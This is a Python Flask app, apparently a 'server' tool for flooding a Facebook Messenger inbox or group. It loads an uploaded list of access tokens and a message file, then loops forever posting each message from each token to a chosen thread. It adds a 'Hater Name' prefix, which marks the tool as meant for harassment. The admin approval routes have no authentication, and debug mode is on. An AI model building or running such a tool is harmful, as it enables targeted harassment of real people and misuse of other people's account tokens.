from flask import Flask, request, render_template_string, redirect
import requests
import time
import threading
import uuid
from datetime import datetime

app = Flask(__name__)
app.debug = True

# ✅ Global job storage
jobs = {}
pending_jobs = {}  # Pending approvals

# ✅ Default headers
default_headers = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json',
}

# ✅ Background worker function
def background_worker(job_id, tokens, headers, thread_id, prefix, time_interval, messages):
    while True:
        try:
            for token in tokens:
                for msg in messages:
                    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    final_msg = f"{prefix + ' ' if prefix else ''}{msg} | ⏰ {now}"

                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    parameters = {'access_token': token.strip(), 'message': final_msg}
                    response = requests.post(api_url, data=parameters, headers=headers)

                    if response.status_code == 200:
                        log = f"[✅ SENT] {thread_id} | {final_msg}"
                    else:
                        log = f"[❌ FAIL] {thread_id} | {final_msg} | {response.text}"

                    jobs[job_id]["logs"].append(log)
                    print(log)
                    time.sleep(time_interval)

        except Exception as e:
            jobs[job_id]["logs"].append(f"⚠️ Error: {e}")
            time.sleep(30)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        thread_id = request.form.get('threadId').strip()
        prefix = request.form.get('prefix')
        time_interval = int(request.form.get('time'))

        token_file = request.files['tokenFile']
        tokens = token_file.read().decode().splitlines()

        headers_file = request.files.get('headersFile')
        if headers_file:
            headers_data = headers_file.read().decode().splitlines()
            headers = {}
            for h in headers_data:
                if ":" in h:
                    key, value = h.split(":", 1)
                    headers[key.strip()] = value.strip()
        else:
            headers = default_headers

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        job_id = str(uuid.uuid4())[:8]  # ✅ Random Short ID
        pending_jobs[job_id] = {
            "thread_id": thread_id,
            "prefix": prefix,
            "time_interval": time_interval,
            "tokens": tokens,
            "headers": headers,
            "messages": messages
        }

        return render_template_string('''
        <html>
        <head>
            <title>Job Submitted</title>
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
        </head>
        <body class="bg-light">
            <div class="container mt-5">
                <div class="alert alert-success text-center">
                    ✅ Job submitted for approval.<br><br>
                    <b>Job ID:</b> {{job_id}} <br><br>
                    <a href="/admin/pending" class="btn btn-primary">🔑 Go to Pending Jobs</a>
                </div>
            </div>
        </body>
        </html>
        ''', job_id=job_id)

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>🚀 CLOCK S9MI S3RV3R</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background-color:#E6E6FA; }
    .card { border-radius:20px; box-shadow:0px 4px 15px rgba(0,0,0,0.1); }
    .btn-success { font-size:18px; font-weight:bold; border-radius:12px; }
  </style>
</head>
<body>
  <div class="container mt-5">
    <div class="card p-4">
      <h2 class="text-center text-primary mb-4">🚀 CLOCK S9MI S3RV3R</h2>
      <form action="/" method="post" enctype="multipart/form-data">
        <label class="form-label">🗝️ Access Token File (.txt) [Multi Token Supported]:</label>
        <input type="file" class="form-control mb-3" name="tokenFile" accept=".txt" required>

        <label class="form-label">🧾 Headers File (.txt) [Optional]:</label>
        <input type="file" class="form-control mb-3" name="headersFile" accept=".txt">

        <label class="form-label">💬 Thread ID (Inbox/Group):</label>
        <input type="text" class="form-control mb-3" name="threadId" required>

        <label class="form-label">😈 Hater Name / Prefix [Optional]:</label>
        <input type="text" class="form-control mb-3" name="prefix">

        <label class="form-label">📝 Message File (.txt):</label>
        <input type="file" class="form-control mb-3" name="txtFile" accept=".txt" required>

        <label class="form-label">⏳ Delay (seconds):</label>
        <input type="number" class="form-control mb-3" name="time" required>

        <button type="submit" class="btn btn-success w-100">🚀 Submit for Approval</button>
      </form>
    </div>
  </div>
</body>
</html>
'''

@app.route('/admin/pending')
def view_pending():
    html = """
    <html><head>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    </head><body class="bg-light"><div class="container mt-4">
    <h2 class="text-center mb-3">⏳ Pending Jobs</h2>
    """
    if not pending_jobs:
        html += "<div class='alert alert-warning'>⚠ No pending jobs found.</div>"
    for job_id, data in pending_jobs.items():
        html += f"""
        <div class="card p-3 mb-3 shadow">
            <b>Job ID:</b> {job_id}<br>
            <b>Thread:</b> {data['thread_id']}<br>
            <b>Delay:</b> {data['time_interval']} sec<br>
            <b>Messages:</b> {len(data['messages'])} lines<br><br>
            <a href='/admin/approve/{job_id}' class='btn btn-success btn-sm'>✅ Approve</a>
            <a href='/admin/reject/{job_id}' class='btn btn-danger btn-sm'>❌ Reject</a>
        </div>
        """
    html += "</div></body></html>"
    return html

@app.route('/admin/approve/<job_id>')
def approve_job(job_id):
    if job_id not in pending_jobs:
        return "❌ Job not found!"
    data = pending_jobs.pop(job_id)
    jobs[job_id] = {"logs": [f"✅ Job {job_id} Approved"]}
    t = threading.Thread(target=background_worker, args=(job_id, data['tokens'], data['headers'], data['thread_id'], data['prefix'], data['time_interval'], data['messages']))
    t.daemon = True
    t.start()
    return redirect(f"/status/{job_id}")

@app.route('/admin/reject/<job_id>')
def reject_job(job_id):
    if job_id not in pending_jobs:
        return "❌ Job not found!"
    pending_jobs.pop(job_id)
    return "<h3>❌ Job Rejected</h3><a href='/admin/pending'>Go Back</a>"

@app.route('/status/<job_id>')
def job_status(job_id):
    if job_id not in jobs:
        return "❌ Invalid Job ID!"
    logs = "<br>".join(jobs[job_id]["logs"][-50:])
    return f"""
    <html><head>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    </head><body class="bg-light"><div class="container mt-4">
    <h2 class="text-primary">📊 Job Status — {job_id}</h2>
    <div class="card p-3 shadow"><pre>{logs}</pre></div>
    <a href='/admin/pending' class='btn btn-secondary mt-3'>⬅ Back</a>
    </div></body></html>
    """

def keep_alive():
    while True:
        try:
            requests.get("https://yourapp.yourusername.repl.co")
        except:
            pass
        time.sleep(60)

threading.Thread(target=keep_alive, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
